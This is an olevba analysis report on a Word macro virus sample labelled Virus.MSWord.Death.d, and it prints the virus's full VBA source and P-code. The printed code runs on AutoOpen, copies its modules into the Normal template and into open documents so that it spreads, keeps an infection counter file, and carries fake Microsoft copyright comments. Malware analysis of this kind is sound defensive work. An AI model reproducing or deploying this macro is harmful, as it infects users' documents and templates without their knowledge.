olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Death.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Death.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AddString.bas 
in file: Virus.MSWord.Death.d - OLE stream: 'Macros/VBA/AddString'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados
Public pq As String



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Web.AddString.AutoOpen"
 Call AddFile
 Call AddNew
 'Call MailNew
 'Call Verday
End Sub
 
Sub AddNew()
Attribute AddNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AddNew.VB_ProcData.VB_Invoke_Func = "Web.AddString.AddNew"
Dim exec
exec = Counter()

On Error GoTo 0
Open pq + "\Death Kiss.Ini" For Output As #1
Print #1, exec + 1
Close #1

Doc = ActiveDocument.Path + "\" + ActiveDocument.Name
dot = NormalTemplate.FullName

On Error Resume Next

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddString", _
       object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddMail", _
       object:=wdOrganizerObjectProjectItems

On Error GoTo 0
On Error Resume Next

Application.OrganizerCopy Source:=dot, _
       Destination:=Doc, Name:="AddString", _
       object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=dot, _
       Destination:=ActiveDocument.Name, Name:="AddMail", _
       object:=wdOrganizerObjectProjectItems

On Error GoTo 0

End Sub

Function Counter()
Dim exec
exec = ""
On Error Resume Next
Open pq + "\Death Kiss.Ini" For Input As #1
Input #1, exec
Close #1
On Error GoTo 0
Counter = Val(exec)
End Function

Function AddFile()
Dim meucar As String
cdir = CurDir()

On Error Resume Next
  ChDir "\"
  MkDir "\Windows"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows"
MkDir "Application Users"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows\Application Users"
MkDir "AddFile"
On Error GoTo 0

ChDir cdir
pq = "\Windows\Application Users\AddFile"
On Error GoTo 0

p = ActiveDocument.Path + "\Pesquisa de Opinião.doc"

If Counter() = 0 Then
   On Error Resume Next
   Open p For Binary As #1
   Do While Meulocal < LOF(1)
       meucar = meucar & Input(2048, #1)
       Meulocal = Loc(1)
   Loop
   Close #1

   Open pq + "\Pesquisa de Opinião.doc" For Binary Access Write As #1
   Put #1, , meucar
   Close #1
   On Error GoTo 0
End If
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Death.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 900 bytes
' Macros/VBA/AddString - 4803 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0028 "The Microsoft Word Language Visual Basic"
' Line #1:
' 	QuoteRem 0x0000 0x001C "Copyright (c) 1999 Microsoft"
' Line #2:
' 	QuoteRem 0x0000 0x001C "Todos os direitos reservados"
' Line #3:
' 	Dim (Public) 
' 	VarDefn pq (As String)
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	ArgsCall (Call) AddFile 0x0000 
' Line #9:
' 	ArgsCall (Call) AddNew 0x0000 
' Line #10:
' 	QuoteRem 0x0001 0x000C "Call MailNew"
' Line #11:
' 	QuoteRem 0x0001 0x000B "Call Verday"
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Sub AddNew())
' Line #15:
' 	Dim 
' 	VarDefn exec
' Line #16:
' 	ArgsLd Counter 0x0000 
' 	St exec 
' Line #17:
' Line #18:
' 	OnError (GoTo 0) 
' Line #19:
' 	Ld pq 
' 	LitStr 0x000F "\Death Kiss.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld exec 
' 	LitDI2 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St Doc 
' Line #24:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St dot 
' Line #25:
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' Line #28:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld Doc 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AddString"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' Line #30:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld Doc 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AddMail"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' Line #32:
' 	OnError (GoTo 0) 
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' Line #35:
' 	LineCont 0x0008 07 00 07 00 0F 00 07 00
' 	Ld dot 
' 	ParamNamed Source 
' 	Ld Doc 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AddString"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' Line #37:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld dot 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AddMail"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' Line #39:
' 	OnError (GoTo 0) 
' Line #40:
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Function Counter())
' Line #44:
' 	Dim 
' 	VarDefn exec
' Line #45:
' 	LitStr 0x0000 ""
' 	St exec 
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Ld pq 
' 	LitStr 0x000F "\Death Kiss.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld exec 
' 	InputItem 
' 	InputDone 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' 	OnError (GoTo 0) 
' Line #51:
' 	Ld exec 
' 	ArgsLd Val 0x0001 
' 	St Counter 
' Line #52:
' 	EndFunc 
' Line #53:
' Line #54:
' 	FuncDefn (Function AddFile())
' Line #55:
' 	Dim 
' 	VarDefn meucar (As String)
' Line #56:
' 	ArgsLd CurDir 0x0000 
' 	St cdir 
' Line #57:
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	LitStr 0x0001 "\"
' 	ArgsCall ChDir 0x0001 
' Line #60:
' 	LitStr 0x0008 "\Windows"
' 	ArgsCall MkDir 0x0001 
' Line #61:
' 	OnError (GoTo 0) 
' Line #62:
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitStr 0x0008 "\Windows"
' 	ArgsCall ChDir 0x0001 
' Line #65:
' 	LitStr 0x0011 "Application Users"
' 	ArgsCall MkDir 0x0001 
' Line #66:
' 	OnError (GoTo 0) 
' Line #67:
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LitStr 0x001A "\Windows\Application Users"
' 	ArgsCall ChDir 0x0001 
' Line #70:
' 	LitStr 0x0007 "AddFile"
' 	ArgsCall MkDir 0x0001 
' Line #71:
' 	OnError (GoTo 0) 
' Line #72:
' Line #73:
' 	Ld cdir 
' 	ArgsCall ChDir 0x0001 
' Line #74:
' 	LitStr 0x0022 "\Windows\Application Users\AddFile"
' 	St pq 
' Line #75:
' 	OnError (GoTo 0) 
' Line #76:
' Line #77:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0018 "\Pesquisa de Opinião.doc"
' 	Add 
' 	St p 
' Line #78:
' Line #79:
' 	ArgsLd Counter 0x0000 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #82:
' 	Ld Meulocal 
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	Lt 
' 	DoWhile 
' Line #83:
' 	Ld meucar 
' 	LitDI2 0x0800 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	Concat 
' 	St meucar 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd Loc 0x0001 
' 	St Meulocal 
' Line #85:
' 	Loop 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #87:
' Line #88:
' 	Ld pq 
' 	LitStr 0x0018 "\Pesquisa de Opinião.doc"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld meucar 
' 	PutRec 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	OnError (GoTo 0) 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndFunc 
' Line #94:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

